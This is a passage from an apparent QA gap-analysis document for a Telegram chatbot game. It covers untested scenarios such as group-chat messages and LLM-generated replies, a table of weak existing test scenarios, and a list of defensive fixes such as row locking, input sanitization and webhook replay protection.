  And the user advances through chapters at an accelerated pace
  And the engagement system may flag this as "clingy" (high frequency + quality)
  But the vice system detects no authentic personality signals
  And the game experience lacks genuine connection
  # Risk: No anti-gaming mechanism for LLM-generated responses
  # Question: Is this a problem? The user is "playing the game" even if artificially

Scenario: S-GAP-MJ-6 - Group chat/forwarded message reaches bot [P2-Medium]
  Given a user adds @Nikita_my_bot to a Telegram group chat
  When multiple users send messages in the group
  Then the webhook receives messages from different users in the same chat
  And the bot may respond to non-registered users
  And scoring may attribute messages to the wrong user
  Or the bot may crash trying to find a user by an unknown telegram_id
  # Missing: No scenario for group chat behavior
  # Risk: Telegram bots can be added to groups unless explicitly restricted
  # Verify: Bot API settings — is group chat mode disabled?
```

---

## Cross-Reference: Existing Scenarios That Need Strengthening

| Existing Scenario | Gap Identified |
|-------------------|----------------|
| S-2.1.2 (Skip rate) | Doesn't verify skipped messages DON'T create score_history entries |
| S-4.3.4 (Grace boundary) | States decay IS applied but doesn't verify >= vs > operator |
| S-10.5.5 (3+ attempts) | Doesn't specify permanent fate of max-attempt conversations |
| S-11.3.3 (Portal deletion) | Doesn't verify auth.users is also deleted (only app_users CASCADE) |
| S-7.5.3 (Voice + boss) | States available=true but doesn't address voice ≠ boss response (see S-GAP-XP-1) |

---

## Recommendations

1. Add row-level locking to scoring paths (SELECT FOR UPDATE or optimistic concurrency)
2. Add distributed lock to pg_cron job endpoints (check job_executions for in_progress)
3. Restrict admin email registration via Supabase auth hook or whitelist
4. Sanitize message display in portal (verify Next.js escaping on conversation detail pages)
5. Add session validation to voice signed_token (check session status, not just timestamp)
6. Add game_status check to scheduled event delivery (skip if boss_fight or terminal)
7. Add boss_fight voice response handling (disable voice during boss_fight or route to boss judgment)
8. Add new user decay protection (grace period extension for first 48 hours)
9. Add pipeline stage idempotency (deduplicate facts/entities on retry)
10. Add webhook replay protection for Telegram (timestamp check similar to ElevenLabs)
